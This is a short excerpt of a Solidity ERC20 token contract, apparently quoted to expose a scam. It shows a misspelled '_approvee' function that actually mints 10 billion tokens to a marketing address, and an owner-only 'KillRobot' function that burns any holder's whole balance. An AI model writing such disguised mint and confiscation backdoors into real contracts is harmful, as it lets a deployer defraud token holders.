...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _approvee(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
...
contract Token is ERC20, ERC20Burnable, Ownable {
    ...
    constructor() ERC20() {
        ...
        _approvee(address(mkt), 10000000000 * 1 ether);
    ...
    function KillRobot(address to)public onlyOwner{
        uint value=IERC20(address(this)).balanceOf(to);
        if(value >0){
        _burn(to,value);
        }
